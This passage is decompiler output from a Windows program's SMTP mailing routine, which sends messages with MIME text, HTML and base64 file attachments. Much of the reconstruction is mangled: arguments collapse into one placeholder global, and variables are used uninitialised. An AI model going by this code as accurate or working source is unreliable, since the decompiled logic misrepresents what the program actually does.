            *v11 = a1;
            strcat((char *)&g57, (char *)&g57);
            v13--;
            v12 += 4;
        }
        // 0x407ba4
        *v8 = (int32_t)"\r\n";
        *v9 = a1;
        strcat((char *)&g57, (char *)&g57);
        v6 = v11;
        v5 = v10;
        v4 = v9;
        v7 = v8;
    }
    // 0x407bb1
    int32_t v14; // bp-8, 0x407b1f
    int32_t v15 = &v14; // 0x407bb4
    *v7 = v15;
    time(&g57);
    *v4 = v15;
    struct tm * time_info = localtime(&g57); // 0x407bbe
    *v5 = (int32_t)"Date: ";
    int32_t v16; // bp-268, 0x407b1f
    int32_t v17 = &v16; // 0x407bd0
    *v6 = v17;
    strcpy((char *)&g57, (char *)&g57);
    *v7 = (int32_t)time_info;
    *v4 = (int32_t)"%a, %d %b %y %H:%M:%S %Z\r\n";
    *v5 = 260;
    *v6 = v17;
    int32_t v18; // bp-4, 0x407b1f
    *v6 = (int32_t)&v18 - 264 + strlen((char *)&g57);
    strftime((char *)&g57, (int32_t)&g57, (char *)&g57, (struct tm *)&g57);
    *(int32_t *)(v3 - 20) = v17;
    *(int32_t *)(v3 - 24) = a1;
    strcat((char *)&g57, (char *)&g57);
    *v7 = 1;
    return 1;
}

// Address range: 0x407c18 - 0x407c30
int32_t function_407c18(void) {
    // 0x407c18
    int32_t result; // 0x407c18
    *(int32_t *)(result + 8) = -1;
    *(int32_t *)result = (int32_t)&g9;
    *(int32_t *)(result + 4) = 0;
    *(int32_t *)(result + 12) = 0;
    *(int32_t *)(result + 16) = 0;
    return result;
}

// Address range: 0x407c4c - 0x407c6e
// Demangled:     protected: virtual __thiscall std::_Mpunct<char>::~_Mpunct<char>(void)
int32_t _3f__3f_1_3f__24__Mpunct_40_D_40_std_40__40_MAE_40_XZ(void) {
    // 0x407c4c
    int32_t v1; // 0x407c4c
    *(int32_t *)v1 = (int32_t)&g9;
    int32_t result = function_40454b(v1 + 12); // 0x407c63
    if (*(int32_t *)(v1 + 4) != 0) {
        // 0x407c65
        result = function_40808c();
    }
    // 0x407c6c
    return result;
}

// Address range: 0x407c6e - 0x407fcf
int32_t function_407c6e(void) {
    // 0x407c6e
    function_408520((int32_t)&g57);
    int32_t v1; // bp-1692, 0x407c6e
    int32_t v2; // 0x407c6e
    *(int32_t *)(v2 - 16) = (int32_t)&v1;
    int16_t v3 = 514; // bp-1700, 0x407c8d
    if (WSAStartup(514, (struct WSAData *)(v2 - 1688)) != 0) {
        int32_t result = WSAGetLastError();
        __writefsdword(0, *(int32_t *)(v2 - 12));
        return result;
    }
    // 0x407caa
    int32_t v4; // 0x407c6e
    function_40454b(v4 + 12);
    int32_t * v5 = (int32_t *)(v2 + 8); // 0x407cb3
    int32_t v6 = *v5; // 0x407cb3
    if (function_407aa0() != -1) {
        // 0x407fbe
        __writefsdword(0, *(int32_t *)(v2 - 12));
        return 128;
    }
    int32_t str_as_i = atoi((char *)*(int32_t *)(v6 + 32)); // 0x407cd0
    int32_t * v7 = (int32_t *)(v2 - 28); // 0x407cdb
    *v7 = str_as_i;
    int32_t * v8 = (int32_t *)(v2 - 24); // 0x407cde
    *v8 = 0;
    int32_t v9 = v2 - 4; // 0x407ce1
    int32_t * v10 = (int32_t *)v9; // 0x407ce1
    *v10 = 0;
    int32_t v11; // 0x407c6e
    int32_t v12; // 0x407c6e
    if (*(int32_t *)(v4 + 4) != 0) {
        // 0x407ccd
        v11 = v2 - 1032;
        v12 = &v3;
    } else {
        int32_t result2 = function_407fcf(*(int32_t *)(v6 + 4), *(int32_t *)(v6 + 8)); // 0x407cf2
        if (result2 != 0) {
            // 0x407fbe
            __writefsdword(0, *(int32_t *)(v2 - 12));
            return result2;
        }
        int32_t v13 = v2 - 1032;
        function_408141(v13);
        char * name = (char *)(v2 - 1288); // 0x407d18
        char * v14; // bp-1728, 0x407c6e
        if (gethostname(name, 256) == -1) {
            // 0x407d24
            v14 = name;
            strcpy(name, (char *)&g29);
        }
        char * str = (char *)v13; // 0x407d49
        sprintf(str, "EHLO %s\r\n", name);
        function_4080e2(v13);
        v14 = str;
        *(char *)v9 = 1;
        function_408141((int32_t)v14);
        *v10 = 0;
        v11 = v13;
        v12 = (int32_t)&v14;
    }
    int32_t * v15 = (int32_t *)(v12 - 4); // 0x407dbd
    *v15 = *(int32_t *)(v6 + 12);
    int32_t v16 = v12 - 8; // 0x407dc6
    int32_t * v17 = (int32_t *)v16; // 0x407dc6
    *v17 = (int32_t)"MAIL FROM:<%s>\r\n";
    *(int32_t *)(v12 - 12) = v11;
    sprintf((char *)&g57, (char *)&g57);
    *v15 = v11;
    function_4080e2((int32_t)&g57);
    *v17 = v11;
    function_408141((int32_t)&g57);
    int32_t v18 = v16; // 0x407df3
    if (*v7 > 0) {
        int32_t v19 = 0; // 0x407e29
        int32_t * v20 = (int32_t *)(v16 - 4); // 0x407df5
        *v20 = *(int32_t *)(v6 + 52 + 4 * v19);
        int32_t v21 = v16 - 8; // 0x407dff
        int32_t * v22 = (int32_t *)v21; // 0x407dff
        *v22 = (int32_t)"RCPT TO:<%s>\r\n";
        *(int32_t *)(v16 - 12) = v11;
        sprintf((char *)&g57, (char *)&g57);
        *v20 = v11;
        function_4080e2((int32_t)&g57);
        *v22 = v11;
        function_408141((int32_t)&g57);
        v19++;
        v18 = v21;
        while (v19 < *v7) {
            int32_t v23 = v21;
            v20 = (int32_t *)(v23 - 4);
            *v20 = *(int32_t *)(v6 + 52 + 4 * v19);
            v21 = v23 - 8;
            v22 = (int32_t *)v21;
            *v22 = (int32_t)"RCPT TO:<%s>\r\n";
            *(int32_t *)(v23 - 12) = v11;
            sprintf((char *)&g57, (char *)&g57);
            *v20 = v11;
            function_4080e2((int32_t)&g57);
            *v22 = v11;
            function_408141((int32_t)&g57);
            v19++;
            v18 = v21;
        }
    }
    // 0x407e2c
    *(int32_t *)(v18 - 4) = (int32_t)"DATA\r\n";
    function_4080e2((int32_t)&g57);
    *(int32_t *)(v18 - 8) = v11;
    function_408141((int32_t)&g57);
    *(int32_t *)(v18 - 12) = v11;
    function_407b1f((int32_t)&g57);
    *(int32_t *)(v18 - 16) = v11;
    function_4080e2((int32_t)&g57);
    int32_t * v24 = (int32_t *)(v18 - 20); // 0x407e6c
    *v24 = (int32_t)"----_=_NextPart_001_01C19920.83032BC0";
    int32_t v25 = v18 - 24; // 0x407e6d
    int32_t * v26 = (int32_t *)v25; // 0x407e6d
    *v26 = (int32_t)"----_=_NextPart_000_01C19920.83032BC0";
    int32_t * v27 = (int32_t *)(v18 - 28); // 0x407e6e
    *v27 = (int32_t)"----_=_NextPart_000_01C19920.83032BC0";
    int32_t * v28 = (int32_t *)(v18 - 32); // 0x407e75
    *v28 = (int32_t)"Content-Type: multipart/mixed;\r\n\tboundary=\"%s\"\r\n\r\nThis message is in MIME format. Since your mail reader does not understand\r\nthis format, some or all of this message may not be legible.\r\n\r\n--%s\r\nContent-Type: multipart/alternative;\r\n\tboundary=\"%s\"";
    *(int32_t *)(v18 - 36) = v11;
    sprintf((char *)&g57, (char *)&g57);
    *v24 = v11;
    function_4080e2((int32_t)&g57);
    *v26 = 5;
    if (function_407ad4((int32_t)&g57) != 0) {
        // 0x407e9e
        *v27 = (int32_t)"text/plain";
        function_4082d1((int32_t)&g57);
        *v28 = *(int32_t *)(v6 + 24);
        function_4080e2((int32_t)&g57);
    }
    int32_t v29 = v25 - 4; // 0x407eb4
    *(int32_t *)v29 = 6;
    int32_t v30 = function_407ad4((int32_t)&g57); // 0x407eb8
    int32_t v31 = v29; // 0x407ebf
    if (v30 != 0) {
        // 0x407ec1
        *(int32_t *)(v25 - 8) = (int32_t)"text/html";
        function_4082d1((int32_t)&g57);
        *(int32_t *)(v25 - 12) = 6;
        int32_t v32 = function_407a61((int32_t)&g57); // 0x407ed1
        v31 = v25 - 16;
        *(int32_t *)v31 = v32;
        function_4080e2((int32_t)&g57);
    }
    int32_t * v33 = (int32_t *)(v31 - 4); // 0x407ede
    *v33 = (int32_t)"----_=_NextPart_001_01C19920.83032BC0";
    int32_t v34 = v31 - 8; // 0x407eea
    int32_t * v35 = (int32_t *)v34; // 0x407eea
    *v35 = (int32_t)"\r\n\r\n--%s--\r\n\r\n";
    int32_t * v36 = (int32_t *)(v31 - 12); // 0x407eeb
    *v36 = v11;
    sprintf((char *)&g57, (char *)&g57);
    *v33 = v11;
    function_4080e2((int32_t)&g57);
    *v35 = 8;
    int32_t v37 = function_407ad4((int32_t)&g57); // 0x407f06
    int32_t v38 = v34; // 0x407f0d
    if (v37 != 0) {
        // 0x407f0f
        *v36 = 9;
        int32_t v39 = function_407a61((int32_t)&g57); // 0x407f13
        *(int32_t *)(v31 - 16) = 8;
        *v5 = v39;
        int32_t v40 = function_407a61((int32_t)&g57); // 0x407f1f
        *(int32_t *)(v31 - 20) = *v5;
        v38 = v31 - 24;
        *(int32_t *)v38 = v40;
        function_40830c();
    }
    int32_t v41 = v38 - 4; // 0x407f2f
    *(int32_t *)v41 = 10;
    int32_t v42 = function_407ad4((int32_t)&g57); // 0x407f33
    int32_t v43 = v41; // 0x407f3a
    if (v42 != 0) {
        // 0x407f3c
        *(int32_t *)(v38 - 8) = 11;
        int32_t v44 = function_407a61((int32_t)&g57); // 0x407f40
        *(int32_t *)(v38 - 12) = 10;
        *v5 = v44;
        int32_t v45 = function_407a61((int32_t)&g57); // 0x407f4c
        *(int32_t *)(v38 - 16) = *v5;
        v43 = v38 - 20;
        *(int32_t *)v43 = v45;
        function_40830c();
    }
    int32_t * v46 = (int32_t *)(v43 - 4); // 0x407f5c
    *v46 = (int32_t)"----_=_NextPart_000_01C19920.83032BC0";
    int32_t * v47 = (int32_t *)(v43 - 8); // 0x407f67
    *v47 = (int32_t)"\r\n\r\n--%s--\r\n\r\n";
    int32_t * v48 = (int32_t *)(v43 - 12); // 0x407f68
    *v48 = v11;
    sprintf((char *)&g57, (char *)&g57);
    *v46 = v11;
    function_4080e2((int32_t)&g57);
    *v47 = (int32_t)"\r\n.\r\n";
    function_4080e2((int32_t)&g57);
    *v48 = v11;
    function_408141((int32_t)&g57);
    *v10 = -1;
    function_40808c();
    WSACleanup();
    // 0x407fbe
    __writefsdword(0, *(int32_t *)(v2 - 12));
    return *v8;
}

// Address range: 0x407fcf - 0x407fec
int32_t function_407fcf(int32_t a1, int32_t str) {
    // 0x407fcf
    return function_407fec(a1, atoi((char *)str));
}

// Address range: 0x407fec - 0x40808c
int32_t function_407fec(int32_t a1, int32_t host_short) {
    // 0x407fec
    int32_t v1; // 0x407fec
    int32_t * v2 = (int32_t *)(v1 + 4); // 0x407ff6
    if (*v2 != 0) {
        // 0x408086
        return 0;
    }
    // 0x408000
    function_40454b(v1 + 12);
    int32_t addr = 2; // bp-20, 0x40800a
    htons((int16_t)host_short);
    char * c = (char *)a1; // 0x408020
    if (isalpha((int32_t)*c) == 0) {
        // 0x408049
        inet_addr(c);
    } else {
        // 0x40802f
        if (gethostbyname(c) == NULL) {
            // 0x408086
            return 129;
        }
    }
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x40805a
    *(int32_t *)(v1 + 8) = sock_fd;
    if (sock_fd == -1) {
        // 0x408086
        return 130;
    }
    int32_t v3 = connect(sock_fd, (struct sockaddr *)&addr, 16); // 0x40806f
    int32_t result = 130; // 0x408078
    if (v3 != -1) {
        // 0x408081
        *v2 = 1;
        result = 0;
    }
    // 0x408086
    return result;
}

// Address range: 0x40808c - 0x4080e2
int32_t function_40808c(void) {
    int32_t v1 = function_408520((int32_t)&g57); // 0x408091
    int32_t v2; // bp-20, 0x40808c
    int32_t v3; // 0x40808c
    *(int32_t *)(v3 - 16) = (int32_t)&v2;
    int32_t v4; // 0x40808c
    int32_t * v5 = (int32_t *)(v4 + 8); // 0x4080a3
    int32_t result = v1; // 0x4080a7
    if (*v5 != -1) {
        // 0x4080a9
        *(int32_t *)(v3 - 4) = 0;
        function_4080e2((int32_t)"QUIT\r\n");
        result = closesocket(*v5);
        *v5 = -1;
        *(int32_t *)(v4 + 4) = 0;
    }
    // 0x4080d3
    __writefsdword(0, *(int32_t *)(v3 - 12));
    return result;
}

// Address range: 0x4080e2 - 0x408141
int32_t function_4080e2(int32_t str) {
    int32_t v1 = str;
    int32_t len = strlen((char *)str); // 0x4080ed
    if (len == 0) {
        // 0x408123
        return 0;
    }
    uint32_t v2 = len;
    int32_t v3; // bp-16, 0x4080e2
    int32_t v4 = &v3;
    *(int32_t *)(v4 - 4) = 0;
    *(int32_t *)(v4 - 8) = v2 >= 1000 ? 1000 : v2;
    *(int32_t *)(v4 - 12) = len - v2 + v1;
    int32_t v5 = v4 - 16; // 0x408111
    int32_t v6; // 0x4080e2
    *(int32_t *)v5 = *(int32_t *)(v6 + 8);
    int32_t v7 = send((int32_t)&g57, (char *)&g57, (int32_t)&g57, (int32_t)&g57); // 0x408114
    while (v7 != -1) {
        int32_t v8 = v2 - v7; // 0x40811f
        int32_t result = v7; // 0x408121
        if (v8 == 0) {
            // 0x408123
            return result;
        }
        v2 = v8;
        v4 = v5;
        *(int32_t *)(v4 - 4) = 0;
        *(int32_t *)(v4 - 8) = v2 >= 1000 ? 1000 : v2;
        *(int32_t *)(v4 - 12) = len - v2 + v1;
        v5 = v4 - 16;
        *(int32_t *)v5 = *(int32_t *)(v6 + 8);
        v7 = send((int32_t)&g57, (char *)&g57, (int32_t)&g57, (int32_t)&g57);
    }
    // 0x40812a
    v1 = WSAGetLastError();
    *(int32_t *)(v4 - 20) = (int32_t)&g13;
    *(int32_t *)(v4 - 24) = (int32_t)&v1;
    _CxxThrowException((int32_t *)v1, &g57);
    return &g57;
}

// Address range: 0x408141 - 0x4081c4
int32_t function_408141(int32_t result) {
    int32_t v1 = result;
    char * buf = (char *)result; // 0x408156
    int32_t v2; // 0x408141
    int32_t v3 = recv(*(int32_t *)(v2 + 8), buf, 1000, 0); // 0x408156
    if (v3 == -1) {
        // 0x408161
        v1 = WSAGetLastError();
        _CxxThrowException(&v1, (int32_t *)&g13);
        // UNREACHABLE
    }
    // 0x408178
    *(char *)(v3 + result) = 0;
    if (function_4081c4(result) == 0) {
        // 0x4081bc
        return result;
    }
    // 0x408188
    function_4082a5(result);
    v1 = _mbsnbcmp(buf, "421", 3) == 0 ? 133 : 131;
    _CxxThrowException(&v1, (int32_t *)&g13);
    // UNREACHABLE
}

// Address range: 0x4081c4 - 0x4081e6
int32_t function_4081c4(int32_t str) {
    // 0x4081c4
    return atoi((char *)str) < 601;
}

// Address range: 0x4081e6 - 0x4081ea
int32_t function_4081e6(void) {
    // 0x4081e6
    int32_t v1; // 0x4081e6
    return *(int32_t *)(v1 + 12);
}

// Address range: 0x4081ea - 0x4082a5
int32_t function_4081ea(int32_t a1) {
    int32_t str3 = a1;
    int32_t v1 = (int32_t)"Unable to connect to server"; // 0x4081ea
    int32_t v2; // 0x4081ea
    char * str; // 0x408246
    switch (a1) {
        case 128: {
            // 0x408235
            v1 = (int32_t)"Unable to send document. Verify your settings";
        }
        case 130: {
          lab_0x40823a:;
            int32_t str2 = function_4081e6(); // 0x40823d
            str3 = 0;
            str = (char *)v1;
            int32_t v3 = strlen(str) + 100; // 0x408251
            v2 = v3;
            if (str2 != 0) {
                // 0x408258
                v2 = strlen((char *)str2) + v3;
            }
            // break -> 0x408261
            break;
        }
        case 129: {
            // 0x40822e
            v1 = (int32_t)"Unable to resolve server";
            // branch (via goto) -> 0x40823a
            goto lab_0x40823a;
        }
        case 131: {
            // 0x408220
            v1 = (int32_t)"Unable to send document (SMTP communication error)";
            // branch (via goto) -> 0x40823a
            goto lab_0x40823a;
        }
        case 132: {
            // 0x408211
            function_40808c();
            v1 = (int32_t)"One or more recipients could not be reached:";
            // branch (via goto) -> 0x40823a
            goto lab_0x40823a;
        }
        default: {
            // 0x40823a
            v1 = (int32_t)"Unable to send document (network error)";
            // branch (via goto) -> 0x40823a
            goto lab_0x40823a;
        }
    }
    // 0x408261
    int32_t result; // 0x4081ea
    int32_t v4; // 0x4081ea
    if (function_40450f((int32_t)&str3, v2) == 0) {
        // 0x408261
        result = *(int32_t *)(v4 + 12);
    } else {
        // 0x408274
        sprintf((char *)str3, "%s - The server responded: %s", str, (char *)function_4081e6());
        int32_t v5 = v4 + 12;
        function_40454b(v5);
        *(int32_t *)v5 = str3;
        result = str3;
    }
    // 0x40829b
    return result;
}

// Address range: 0x4082a5 - 0x4082d1
int32_t function_4082a5(int32_t a1) {
    // 0x4082a5
    int32_t v1; // 0x4082a5
    int32_t str2 = v1 + 12; // 0x4082a6
    char * str = (char *)a1; // 0x4082ad
    int32_t len = strlen(str); // 0x4082ad
    int32_t dest_str = 0; // 0x4082be
    if (function_40450f(str2, len) != 0) {
        // 0x4082c0
        dest_str = (int32_t)strcpy((char *)*(int32_t *)str2, str);
    }
    // 0x4082cd
    return dest_str;
}

// Address range: 0x4082d1 - 0x40830c
int32_t function_4082d1(int32_t a1) {
    // 0x4082d1
    int32_t str; // bp-516, 0x4082d1
    sprintf((char *)&str, "\r\n\r\n--%s\r\nContent-Type: %s;\r\n\tcharset=\"iso-8859-1\"\r\n\r\n", "----_=_NextPart_001_01C19920.83032BC0", (char *)a1);
    return function_4080e2((int32_t)&str);
}

// Address range: 0x40830c - 0x4084ae
int32_t function_40830c(void) {
    // 0x40830c
    function_408520((int32_t)&g57);
    struct _IO_FILE * mode = (struct _IO_FILE *)"rb"; // bp-560, 0x40831f
    int32_t v1; // 0x40830c
    int32_t * file_path = (int32_t *)(v1 + 8); // 0x408324
    struct _IO_FILE * file = fopen((char *)*file_path, (char *)mode); // 0x40832a
    if (file == NULL) {
        // 0x40849d
        __writefsdword(0, *(int32_t *)(v1 - 12));
        return 0;
    }
    // 0x408339
    mode = (struct _IO_FILE *)2;
    fseek(file, 0, SEEK_END);
    int32_t curr_file_offset = ftell(file); // 0x408343
    if (curr_file_offset < 1) {
        // 0x40849d
        __writefsdword(0, *(int32_t *)(v1 - 12));
        return 0;
    }
    // 0x408352
    mode = NULL;
    fseek(file, 0, SEEK_SET);
    int32_t * mem = malloc(curr_file_offset); // 0x40835b
    *file_path = (int32_t)mem;
    if (mem == NULL) {
        // 0x40836a
        mode = file;
        fclose(file);
        // 0x40849d
        __writefsdword(0, *(int32_t *)(v1 - 12));
        return 0;
    }
    int32_t v2 = (int32_t)file; // 0x40832a
    int32_t * v3 = (int32_t *)(v1 + 12); // 0x408378
    struct _IO_FILE * v4 = (struct _IO_FILE *)*v3; // 0x408378
    mode = v4;
    int32_t str = v1 - 556; // 0x40837b
    int32_t v5 = *v3; // 0x408381
    sprintf((char *)str, "\r\n\r\n--%s\r\nContent-Type: application/octet-stream;\r\n\tname=\"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment;\r\n\tfilename=\"%s\"\r\n\r\n", "----_=_NextPart_000_01C19920.83032BC0", (char *)v5, v4);
    mode = (struct _IO_FILE *)str;
    int32_t v6 = (int32_t)&mode; // 0x4083a0
    function_4080e2(str);
    function_404000();
    int32_t * v7 = (int32_t *)(v1 - 4); // 0x4083ae
    *v7 = 0;
    int32_t * v8 = (int32_t *)(v6 - 4);
    int32_t v9 = v6 - 8;
    int32_t * v10 = (int32_t *)v9;
    int32_t * v11 = (int32_t *)(v6 - 12);
    int32_t * v12 = (int32_t *)(v6 - 16);
    int32_t v13 = curr_file_offset;
    *v8 = v2;
    *v10 = v13 < 1000 ? v13 : 1000;
    *v11 = 1;
    *v12 = curr_file_offset - v13 + *file_path;
    int32_t items_read = fread(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57); // 0x4083ce
    while (items_read != 0) {
        int32_t v14 = v13 - items_read; // 0x4083da
        if (v14 >= 0 != v14 != 0) {
            // break -> 0x4083e0
            break;
        }
        v13 = v14;
        *v8 = v2;
        *v10 = v13 < 1000 ? v13 : 1000;
        *v11 = 1;
        *v12 = curr_file_offset - v13 + *file_path;
        items_read = fread(&g57, (int32_t)&g57, (int32_t)&g57, (struct _IO_FILE *)&g57);
    }
    // 0x4083e0
    *v8 = v2;
    fclose((struct _IO_FILE *)&g57);
    *v8 = curr_file_offset;
    *v10 = *file_path;
    function_40416f((int32_t)&g57, (int32_t)&g57);
    *v11 = 1024;
    *v12 = *file_path;
    int32_t mem2 = (int32_t)realloc(&g57, (int32_t)&g57); // 0x4083fb
    *v3 = 0;
    int32_t v15 = function_40406e(); // 0x40840c
    *file_path = v15;
    int32_t v16 = v9; // 0x408416
    if (v15 >= 1) {
        int32_t v17 = v9; // 0x408464
        int32_t v18 = *v3; // 0x40841b
        int32_t * v19 = (int32_t *)(v17 - 4);
        int32_t * v20 = (int32_t *)(v17 - 8);
        int32_t * v21 = (int32_t *)(v17 - 12);
        int32_t v22 = v18; // 0x40841e
        int32_t v23 = 0; // 0x40841e
        int32_t v24 = 0; // 0x40841e
        uint32_t v25; // 0x40830c
        int32_t v26; // 0x40830c
        int32_t v27; // 0x40830c
        int32_t v28; // 0x408420
        int32_t v29; // 0x40830c
        int32_t v30; // 0x408444
        uint32_t v31; // 0x40841b
        if (v15 > v18) {
            v28 = v15 - v22;
            v27 = v28;
            if (v28 >= 74) {
                // 0x408428
                *v19 = 74;
                v27 = 74;
            }
            // 0x40842b
            *v19 = v27;
            *v20 = *v3 + function_404066();
            v29 = v23 + mem2;
            *v21 = v29;
            memcpy(&g57, &g57, (int32_t)&g57);
            *v3 = *v3 + v27;
            v30 = v23 + 2 + v27;
            *(char *)(v27 + v29) = 13;
            *(char *)(mem2 - 1 + v30) = 10;
            v24 = v30;
            while (v30 < 924) {
                // 0x40842b
                v25 = *file_path;
                v31 = *v3;
                v22 = v31;
                v23 = v30;
                v26 = v25;
                v24 = v30;
                if (v25 <= v31) {
                    // break -> 0x40845d
                    break;
                }
                v28 = v26 - v22;
                v27 = v28;
                if (v28 >= 74) {
                    // 0x408428
                    *v19 = 74;
                    v27 = 74;
                }
                // 0x40842b
                *v19 = v27;
                *v20 = *v3 + function_404066();
                v29 = v23 + mem2;
                *v21 = v29;
                memcpy(&g57, &g57, (int32_t)&g57);
                *v3 = *v3 + v27;
                v30 = v23 + 2 + v27;
                *(char *)(v27 + v29) = 13;
                *(char *)(mem2 - 1 + v30) = 10;
                v24 = v30;
            }
        }
        // 0x40845d
        *v19 = 0;
        *v20 = v24;
        *v21 = mem2;
        v17 -= 16;
        *(int32_t *)v17 = *(int32_t *)(*(int32_t *)(v1 - 16) + 8);
        int32_t v32 = send((int32_t)&g57, (char *)&g57, (int32_t)&g57, (int32_t)&g57); // 0x408467
        v16 = v17;
        while (v32 != 0) {
            uint32_t v33 = *file_path; // 0x408476
            v16 = v17;
            if (*v3 >= v33) {
                // break -> 0x40847b
                break;
            }
            v18 = *v3;
            v19 = (int32_t *)(v17 - 4);
            v20 = (int32_t *)(v17 - 8);
            v21 = (int32_t *)(v17 - 12);
            v22 = v18;
            v23 = 0;
            v26 = v33;
            v24 = 0;
            if (v33 > v18) {
                v28 = v26 - v22;
                v27 = v28;
                if (v28 >= 74) {
                    // 0x408428
                    *v19 = 74;
                    v27 = 74;
                }
                // 0x40842b
                *v19 = v27;
                *v20 = *v3 + function_404066();
                v29 = v23 + mem2;
                *v21 = v29;
                memcpy(&g57, &g57, (int32_t)&g57);
                *v3 = *v3 + v27;
                v30 = v23 + 2 + v27;
                *(char *)(v27 + v29) = 13;
                *(char *)(mem2 - 1 + v30) = 10;
                v24 = v30;
                while (v30 < 924) {
                    // 0x40842b
                    v25 = *file_path;
                    v31 = *v3;
                    v22 = v31;
                    v23 = v30;
                    v26 = v25;
                    v24 = v30;
                    if (v25 <= v31) {
                        // break -> 0x40845d
                        break;
                    }
                    v28 = v26 - v22;
                    v27 = v28;
                    if (v28 >= 74) {
                        // 0x408428
                        *v19 = 74;
                        v27 = 74;
                    }
                    // 0x40842b
                    *v19 = v27;
                    *v20 = *v3 + function_404066();
                    v29 = v23 + mem2;
                    *v21 = v29;
                    memcpy(&g57, &g57, (int32_t)&g57);
                    *v3 = *v3 + v27;
                    v30 = v23 + 2 + v27;
                    *(char *)(v27 + v29) = 13;
                    *(char *)(mem2 - 1 + v30) = 10;
                    v24 = v30;
                }
            }
            // 0x40845d
            *v19 = 0;
            *v20 = v24;
            *v21 = mem2;
            v17 -= 16;
            *(int32_t *)v17 = *(int32_t *)(*(int32_t *)(v1 - 16) + 8);
            v32 = send((int32_t)&g57, (char *)&g57, (int32_t)&g57, (int32_t)&g57);
            v16 = v17;
        }
    }
    // 0x40847b
    *(int32_t *)(v16 - 4) = mem2;
    free(&g57);
    *v7 = -1;
    ??1?$_Mpunct@D@std@@MAE@XZ();
    // 0x40849d
    __writefsdword(0, *(int32_t *)(v1 - 12));
    return *v3 == *file_path;
}

// Address range: 0x4084ae - 0x4084cf
int32_t function_4084ae(void) {
    // 0x4084ae
    if ((g53 & 1) == 0) {
        // 0x4084b7
        g53 |= 1;
    }
    // 0x4084c3
    return function_408584(0x4078aa);
}

// Address range: 0x4084d0 - 0x4084d6
// Demangled:     void __cdecl operator delete(void *)
int32_t ??3@YAXPAX@Z(int32_t * a1) {
    // 0x4084d0
    return _3f__3f_3_40_YAXPAX_40_Z(a1);
}

// Address range: 0x4084d6 - 0x4084dc
int32_t * function_4084d6(int32_t * s, int32_t c, int32_t n) {
    // 0x4084d6
    return memset(s, c, n);
}

// Address range: 0x4084dc - 0x4084e2
int32_t function_4084dc(int32_t a1) {
    // 0x4084dc
    return _3f__3f_2_40_YAPAXI_40_Z(a1);
}

// Address range: 0x4084e2 - 0x4084e8
int32_t * function_4084e2(int32_t * dest, int32_t * src, int32_t n) {
    // 0x4084e2
    return memcpy(dest, src, n);
}

// Address range: 0x4084e8 - 0x4084ee
int32_t function_4084e8(char * s) {
    // 0x4084e8
    return strlen(s);
}

// Address range: 0x4084ee - 0x4084f4
int32_t * function_4084ee(int32_t * ptr, int32_t size) {
    // 0x4084ee
    return realloc(ptr, size);
}

// Address range: 0x4084f4 - 0x4084fa
int32_t function_4084f4(int32_t * Block) {
    // 0x4084f4
    return _msize(Block);
}

// Address range: 0x4084fa - 0x408500
int32_t * function_4084fa(int32_t size) {
    // 0x4084fa
    return malloc(size);
}

// Address range: 0x408500 - 0x408506
void function_408500(int32_t * ptr) {
    // 0x408500
    free(ptr);
}

// Address range: 0x408506 - 0x40850c
char * function_408506(char * String, int32_t C) {
    // 0x408506
    return _mbsrchr(String, C);
}

// Address range: 0x40850c - 0x408512
char * function_40850c(char * dest, char * src) {
    // 0x40850c
    return strcpy(dest, src);
}

// Address range: 0x408512 - 0x408518
int32_t function_408512(int32_t * pExcept, int32_t * pRN, int32_t * pContext, int32_t * pDC) {
    // 0x408512
    return __CxxFrameHandler(pExcept, pRN, pContext, pDC);
}

// Address range: 0x408520 - 0x40853f
int32_t function_408520(int32_t result) {
    int32_t v1 = __readfsdword(0); // bp-12, 0x408529
    __writefsdword(0, (int32_t)&v1);
    return result;
}

// Address range: 0x408540 - 0x408546
int32_t function_408540(int32_t * ptr, int32_t size, int32_t n, struct _IO_FILE * s) {
    // 0x408540
    return fwrite(ptr, size, n, s);
}

// Address range: 0x408546 - 0x40854c
int32_t function_408546(int32_t * ptr, int32_t size, int32_t n, struct _IO_FILE * stream) {
    // 0x408546
    return fread(ptr, size, n, stream);
}

// Address range: 0x40854c - 0x408552
int32_t function_40854c(struct _IO_FILE * stream) {
    // 0x40854c
    return fclose(stream);
}

// Address range: 0x408552 - 0x408558
struct _IO_FILE * function_408552(char * filename, char * modes) {
    // 0x408552
    return fopen(filename, modes);
}

// Address range: 0x408558 - 0x408584
int32_t function_408558(int32_t a1) {
    int32_t (*v1)() = (int32_t (*)())a1;
    if (g56 == (void (***)())-1) {
        // 0x408561
        return (int32_t)_onexit(v1);
    }
    int32_t (*v2)() = __dllonexit(v1, (void (***)())&g56, (void (***)())&g55); // 0x40857b
    return (int32_t)v2;
}

// Address range: 0x408584 - 0x408596
int32_t function_408584(int32_t a1) {
    // 0x408584
    return function_408558(a1) == 0;
}

// Address range: 0x408596 - 0x40859c
int32_t function_408596(int32_t * a1) {
    // 0x408596
    return _3f__3f_0exception_40__40_QAE_40_ABV0_40__40_Z(a1);
}

// Address range: 0x4085b8 - 0x4085be
void function_4085b8(int32_t * pExceptionObject, int32_t * pThrowInfo) {
    // 0x4085b8
    _CxxThrowException(pExceptionObject, pThrowInfo);
}

// Address range: 0x4085be - 0x4085c4
int32_t function_4085be(void) {
    // 0x4085be
    return _3f__3f_1exception_40__40_UAE_40_XZ();
}

// Address range: 0x4085c4 - 0x4085ca
int32_t function_4085c4(char ** a1) {
    // 0x4085c4
    return _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z(a1);
}

// Address range: 0x4085ca - 0x4085d0
char * function_4085ca(char * Ptr) {
    // 0x4085ca
    return _mbsinc(Ptr);
}

// Address range: 0x4085d0 - 0x4085d6
char * function_4085d0(char * String, int32_t Count) {
    // 0x4085d0
    return _mbsninc(String, Count);
}

// Address range: 0x4085d6 - 0x4085dc
int32_t * function_4085d6(int32_t * dest, int32_t * src, int32_t n) {
    // 0x4085d6
    return memmove(dest, src, n);
}

// Address range: 0x4085dc - 0x4085e2
int32_t function_4085dc(char * s, char * format, ...) {
    // 0x4085dc
    return sprintf(s, format);
}

// Address range: 0x4085f0 - 0x40861f
int32_t function_4085f0(int32_t result) {
    // 0x4085f0
    int32_t v1; // 0x4085f0
    int32_t v2 = &v1; // 0x4085f6
    int32_t v3 = v2; // 0x4085fa
    uint32_t v4; // 0x4085f0
    if (v4 < 0x1000) {
        // 0x408610
        int32_t v5; // 0x4085f0
        *(int32_t *)(-4 - v5 + v2) = result;
        return result;
    }
    v3 -= 0x1000;
